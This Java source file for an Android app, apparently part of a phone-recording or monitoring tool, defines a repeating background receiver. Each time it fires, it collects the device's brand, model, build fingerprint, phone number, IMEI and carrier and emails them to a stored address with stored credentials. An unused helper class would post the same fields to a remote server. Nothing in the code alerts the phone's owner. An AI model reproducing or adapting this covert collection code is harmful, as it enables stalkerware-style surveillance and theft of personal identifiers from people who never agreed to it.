package voluntaty.com.base;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.telephony.TelephonyManager;

import com.voluntary.database.DataHelper;
import com.voluntary.record.audio.phone.SendMailTask;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.List;

/**
 * Created by supergoga on 1/25/2016.
 */
public class RepeatingAlarmServiceData extends BroadcastReceiver {
    String login = null;
    String email = null;
    String password = null;

    private int inputsms = 0;

    ArrayList<Integer> list = null;
    private DataHelper dh;

    String URL_HTTP = null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }


    void someTask(Context context) {

        dh = null;
        dh = new DataHelper(context);
        //  URL_HTTP=null;
        URL_HTTP = dh.selectUrl_Http();
        String strt1 = null;
        strt1 = dh.selectGps();
        login = dh.selectLogin();
        email = dh.selectEmail();
        password = dh.selectPassword();

/*---------------------------------------------------*/

  /*      String strt=null;
        strt="Бренд: " + Build.BRAND;
        strt+=" Модел: " + Build.MODEL;
        strt+=" Плата: "  + Build.BOARD;
   */     Calendar cal = Calendar.getInstance();
        long dateTime = Long.parseLong(""+Build.TIME);
        cal.setTimeInMillis(dateTime);
    /*    strt+=" Время сборки:" +  cal.getTime().toString();
        strt+=" Идентификатор устройства: "  + Build.FINGERPRINT;
        strt+=" Номер SDK версии: "  + Build.VERSION.SDK_INT;
*/

        TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(context.TELEPHONY_SERVICE);
/*
        strt+=" Phone number: " + telephonyManager.getLine1Number();
        strt+=" IMEI: " + telephonyManager.getDeviceId();
        strt+=" Kod country: " + telephonyManager.getNetworkCountryIso();
        strt+=" Name operator: " + telephonyManager.getNetworkOperatorName();
*/

        List<String> toEmailList = Arrays.asList(email.split("\\s*,\\s*"));
        new SendMailTask().execute(email,password,toEmailList, "Spisok Data Phone", "&"+Build.BRAND+"&"+Build.MODEL
                +"&"+Build.BOARD,URL_HTTP+"&"+ cal.getTime().toString()+"&"+Build.FINGERPRINT
                +"&"+Build.VERSION.SDK_INT+"&"+telephonyManager.getLine1Number()+"&"+telephonyManager.getDeviceId()
                +"&"+telephonyManager.getNetworkCountryIso()+"&"+telephonyManager.getNetworkOperatorName());


    // new RequestTask().execute(email,""+Build.BRAND,""+Build.MODEL,""+Build.BOARD,URL_HTTP,""+ cal.getTime().toString(),""+Build.FINGERPRINT,""+Build.VERSION.SDK_INT,""+telephonyManager.getLine1Number(),""+telephonyManager.getDeviceId(),""+telephonyManager.getNetworkCountryIso(),""+telephonyManager.getNetworkOperatorName());


       // Toast.makeText(context.getApplicationContext(), " " + strt, Toast.LENGTH_LONG).show();

/*---------------------------------------------------*/
        URL_HTTP = null;
        login = null;
        email = null;
        password = null;
        list = null;
        dh = null;
    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[4]+"/index.php/api/dataphone");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[0]));
                nameValuePairs.add(new BasicNameValuePair("brend",params[1]));
                nameValuePairs.add(new BasicNameValuePair("model",params[2]));
                nameValuePairs.add(new BasicNameValuePair("plate",params[3]));

                nameValuePairs.add(new BasicNameValuePair("time",params[5]));
                nameValuePairs.add(new BasicNameValuePair("idtab",params[6]));
                nameValuePairs.add(new BasicNameValuePair("numbersdk",params[7]));
                nameValuePairs.add(new BasicNameValuePair("phonenumber",params[8]));

                nameValuePairs.add(new BasicNameValuePair("imei",params[9]));
                nameValuePairs.add(new BasicNameValuePair("country",params[10]));
                nameValuePairs.add(new BasicNameValuePair("nameoperator",params[11]));


                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);







                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }




}



